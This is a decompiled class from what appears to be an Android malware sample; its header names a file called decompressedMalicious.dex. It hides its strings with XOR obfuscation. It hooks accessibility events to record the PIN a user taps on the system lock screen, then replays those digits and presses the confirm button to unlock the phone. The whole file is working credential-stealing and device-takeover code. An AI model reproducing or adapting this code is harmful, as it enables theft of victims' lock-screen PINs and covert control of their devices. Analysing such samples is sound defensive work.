package com.zjxyxnvvp.nxvxchltf.util;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import java.util.List;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class h {
    private static short[] $ = {6099, 6111, 6109, 6046, 6097, 6110, 6100, 6082, 6111, 6105, 6100, 6046, 6083, 6089, 6083, 6084, 6101, 6109, 6085, 6105, 6026, 6105, 6100, 6047, 6107, 6101, 6089, 1750, 1754, 1752, 1691, 1748, 1755, 1745, 1735, 1754, 1756, 1745, 1691, 1734, 1740, 1734, 1729, 1744, 1752, 1728, 1756, 1679, 1756, 1745, 1690, 1758, 1744, 1740, 5736, 5732, 5734, 5669, 5738, 5733, 5743, 5753, 5732, 5730, 5743, 5669, 5752, 5746, 5752, 5759, 5742, 5734, 5758, 5730, 5681, 5730, 5743, 5668, 5743, 5742, 5735, 5742, 5759, 5742, 5716, 5737, 5758, 5759, 5759, 5732, 5733, 9156, 9160, 9162, 9097, 9158, 9161, 9155, 9173, 9160, 9166, 9155, 9097, 9172, 9182, 9172, 9171, 9154, 9162, 9170, 9166, 9117, 9166, 9155, 9096, 9164, 9154, 9182, 9208, 9154, 9161, 9171, 9154, 9173, 9208, 9171, 9154, 9183, 9171, 3185, 3197, 3199, 3132, 3187, 3196, 3190, 3168, 3197, 3195, 3190, 3132, 3169, 3179, 3169, 3174, 3191, 3199, 3175, 3195, 3112, 3195, 3190, 3133, 3193, 3191, 3179, 3149, 3191, 3196, 3174, 3191, 3168};

    /* renamed from: a  reason: collision with root package name */
    public static String f367a = "";

    /* renamed from: b  reason: collision with root package name */
    public static boolean f368b;
    public static boolean c;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    private static AccessibilityNodeInfo a(AccessibilityNodeInfo accessibilityNodeInfo, char c2) {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(0, 27, 6064) + c2);
        if (findAccessibilityNodeInfosByViewId == null || findAccessibilityNodeInfosByViewId.isEmpty()) {
            return null;
        }
        return findAccessibilityNodeInfosByViewId.get(0);
    }

    public static void b(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (!f368b && accessibilityEvent.getEventType() == 32) {
            if (UIDNwaidobaWIODb.k) {
                f367a = "";
            } else if (f367a.length() > 0) {
                f368b = true;
            }
        }
        if (accessibilityNodeInfo != null && accessibilityEvent.getPackageName() != null && UIDNwaidobaWIODb.k) {
            if (!f368b) {
                if (accessibilityEvent.getEventType() == 1 && accessibilityNodeInfo.getViewIdResourceName() != null) {
                    if (accessibilityNodeInfo.getViewIdResourceName().substring(0, accessibilityNodeInfo.getViewIdResourceName().length() - 1).equals($(27, 54, 1717))) {
                        f367a += accessibilityNodeInfo.getViewIdResourceName().charAt(27);
                    }
                    if (accessibilityNodeInfo.getViewIdResourceName().equals($(54, 91, 5643))) {
                        String str = f367a;
                        f367a = str.substring(0, str.length() - 1);
                    }
                }
            } else if (c) {
                boolean z = false;
                for (char c2 : f367a.toCharArray()) {
                    AccessibilityNodeInfo a2 = a(accessibilityNodeInfo, c2);
                    if (a2 != null) {
                        a2.performAction(16);
                        c = false;
                        z = true;
                    }
                }
                if (z) {
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(91, 129, 9127));
                    if (findAccessibilityNodeInfosByViewId != null && findAccessibilityNodeInfosByViewId.size() > 0) {
                        findAccessibilityNodeInfosByViewId.get(0).performAction(16);
                        c = false;
                    }
                    List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId2 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId($(129, 162, 3090));
                    if (findAccessibilityNodeInfosByViewId2 != null && findAccessibilityNodeInfosByViewId2.size() > 0) {
                        findAccessibilityNodeInfosByViewId2.get(0).performAction(16);
                        c = false;
                    }
                }
            }
        }
    }
}
